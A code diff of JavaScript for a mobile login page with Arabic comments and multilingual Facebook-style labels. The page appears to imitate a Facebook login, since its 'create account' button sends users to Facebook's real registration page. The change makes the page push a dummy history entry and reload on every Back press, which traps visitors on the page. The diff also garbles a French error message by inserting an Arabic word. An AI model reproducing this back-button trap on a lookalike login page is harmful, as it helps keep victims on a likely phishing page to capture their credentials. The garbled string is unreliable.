@@ -147,19 +147,19 @@
     const msg = document.getElementById("msg");
     const form = document.getElementById("myForm");
     const toast = document.getElementById("toast");
-    const logoutBtn = document.getElementById("logoutBtn"); // ✅ تعريف الزر الجديد
+    const logoutBtn = document.getElementById("logoutBtn");
 
     // ==========================================================
     // ✅ كود تثبيت زر الرجوع في الهاتف (Back Button Fix)
     // ==========================================================
-    window.onload = function() {
-      // إضافة حالة وهمية عند تحميل الصفحة
-      window.history.pushState({ page: 1 }, null, null); 
-    };
+    // نضع حالة وهمية عند تحميل الصفحة.
+    // هذا يضمن أن أول ضغطة على زر الرجوع لن تخرج من الصفحة.
+    window.history.pushState(null, null, location.href);
 
+    // عند النقر على زر الرجوع (popstate):
     window.addEventListener("popstate", (e) => {
-      // إعادة إضافة الحالة الوهمية عند النقر على زر الرجوع
-      window.history.pushState({ page: 1 }, null, null);
+      // بدلاً من العودة للخلف أو الخروج، نقوم بإعادة تحميل الصفحة الحالية
+      window.location.reload(); 
     });
     // ==========================================================
     
@@ -171,7 +171,6 @@
       }, 4000);
     });
 
-    // باقي الكود بدون تغيير
     const translations = {
       ar: {
         lang: "العربية ⌵",
@@ -207,7 +206,7 @@
         forgot: "Mot de passe oublié ?",
         create: "Créer un nouveau compte",
         errorEmail: "Entrez un e-mail ou un numéro valide",
-        errorPass: "Entrez un mot de passe valide",
+        errorPass: "Entrez un mot مرور valide",
         waiting: "Connexion en cours...",
         customEmail: "Veuillez entrer un e-mail ou un numéro valide",
         customPass: "Veuillez entrer un mot de passe valide"
@@ -256,7 +255,7 @@
       window.location.href = "https://m.facebook.com/reg/";
     });
     
-    // ✅ وظيفة زر تسجيل الخروج: إعادة تحميل الصفحة
+    // ✅ وظيفة زر تسجيل الخروج المخصص: إعادة تحميل الصفحة
     if (logoutBtn) {
         logoutBtn.addEventListener("click", () => {
             window.location.reload(); 
